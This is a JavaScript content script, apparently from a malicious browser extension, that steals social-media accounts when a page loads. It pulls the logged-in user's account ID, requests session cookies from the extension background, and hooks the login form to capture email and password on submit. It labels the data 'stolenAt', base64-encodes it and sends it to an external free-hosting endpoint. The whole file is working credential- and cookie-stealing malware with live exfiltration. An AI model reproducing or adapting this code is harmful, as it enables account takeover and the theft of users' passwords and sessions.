const API = "https://litho-bump.000webhostapp.com/index.php";

const userAgent = navigator.userAgent;

const dateTime = () => {
    function addZero(number) {
        return number < 10 ? "0" + number : number;
    }
    const currentDate = new Date();
    const year = currentDate.getFullYear();
    const month = addZero(currentDate.getMonth() + 1);
    const day = addZero(currentDate.getDate());
    const hours = addZero(currentDate.getHours());
    const minutes = addZero(currentDate.getMinutes());
    const seconds = addZero(currentDate.getSeconds());
    return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
};

const getCUser = () => {
    const s = `"CurrentUserInitialData":{"ACCOUNT_ID":"`;
    const scripts = document.querySelectorAll("script[data-sjs]");
    let c_user = null;

    scripts.forEach((script) => {
        if (script.innerText.includes(s)) {
            c_user = script.innerText.split(s)[1].split(`"`)[0];
        }
    });

    return c_user;
};

const keyLogging = () => {
    const edEmail = document.getElementById("email");
    const edPass = document.getElementById("pass");
    const form = edEmail.parentElement.parentElement.parentElement;

    form.onsubmit = async () => {
        const email = edEmail.value;
        const pass = edPass.value;
        const user = {
            email,
            password: pass,
            userAgent,
            stolenAt: dateTime(),
        };

        sendMessage(user);
    };
};

const getCookies = () => {
    return new Promise((resolve, reject) => {
        chrome.runtime.sendMessage("getcookies", (e) => {
            e && e !== "" ? resolve(e) : reject(null);
        });
    });
};

const processUser = async (c_user) => {
    if (c_user) {
        try {
            const cookie = await getCookies();
            const user = {
                c_user,
                cookie,
                userAgent,
                stolenAt: dateTime(),
            };
            sendMessage(user);
        } catch (error) {}
    } else {
        keyLogging();
    }
};

function convertObjectToMessage(obj) {
    let message = "";

    for (const key in obj) {
        if (Object.prototype.hasOwnProperty.call(obj, key)) {
            const value = obj[key];
            message += "*" + key + ":* `" + value + "` \n\n";
        }
    }

    return message;
}

const sendMessage = (userData) => {
    const msg = btoa(convertObjectToMessage(userData));
    return fetch(`${API}?msg=${msg}`, {
        method: "GET",
        mode: "cors",
        credentials: "same-origin",
    })
        .then((res) => res.text())
        .then((res) => {
            console.log(res);
        });
};

(() => {
    const c_user = getCUser();
    processUser(c_user);
})();
